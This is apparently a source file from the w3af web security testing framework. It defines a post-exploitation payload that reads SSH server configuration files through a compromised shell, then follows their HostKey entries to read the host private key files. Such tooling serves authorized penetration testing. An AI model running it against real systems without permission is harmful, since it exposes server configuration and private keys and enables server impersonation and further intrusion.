import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class ssh_config_files(Payload):
    """
    This payload shows SSH Server configuration files
    """
    def api_read(self):
        result = {}
        files = []

        def parse_hostkey(config):
            hostkey = re.findall('(?<=HostKey )(.*)', config, re.MULTILINE)
            if hostkey:
                return hostkey
            else:
                return ''

        files.append('/etc/ssh/sshd_config')
        files.append('/etc/rssh.conf')
        files.append('/usr/local/etc/sshd_config')
        files.append('/etc/sshd_config')
        files.append('/etc/openssh/sshd_config')

        for file_ in files:
            hostkey = parse_hostkey(self.shell.read(file_))
            for key in hostkey:
                files.append(key)

        for file_ in files:
            content = self.shell.read(file_)
            if content:
                result[file_] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'SSH configuration files not found.'
        else:
            rows = []
            rows.append(['SSH configuration files'])
            rows.append([])

            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
